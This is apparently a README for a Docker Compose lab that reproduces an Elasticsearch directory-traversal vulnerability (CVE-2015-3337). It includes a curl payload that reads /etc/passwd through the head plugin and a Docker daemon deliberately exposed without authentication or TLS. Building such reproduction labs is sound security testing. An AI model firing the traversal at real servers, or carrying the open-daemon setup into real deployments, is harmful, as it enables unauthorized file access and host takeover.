This Docker Compose setup runs two services:

1. **Docker-in-Docker (dind)** – based on `docker:20.10-dind`. The daemon is exposed on port **2375** without TLS, allowing unauthenticated remote API access. The daemon is started with an explicit command to listen on the TCP socket (`--host=tcp://0.0.0.0:2375`) and TLS disabled (`--tls=false`).

2. **Elasticsearch** – a custom image built from the vulnerable `elasticsearch:1.4.4` base (pulled from Elastic's registry) and extended with the `elasticsearch-head` plugin version `1.4.0`. The service listens on the standard ports **9200** (HTTP) and **9300** (transport). It is configured for single‑node operation and disables memory locking limits to match the requirements of the older ES releases.

Both containers are launched on the default Docker Compose network, allowing you to reproduce the directory‑traversal scenario described in CVE‑2015‑3337. After running:

```bash
docker compose up -d
```

you can test the vulnerability with:

```bash
curl http://localhost:9200/_plugin/head/../../../etc/passwd
```

If the plugin is correctly installed, the server will return the contents of `/etc/passwd`, demonstrating the vulnerability.

No additional manual setup is required; the `docker compose up` command builds the custom Elasticsearch image, starts both services, and exposes them on the host ports indicated above.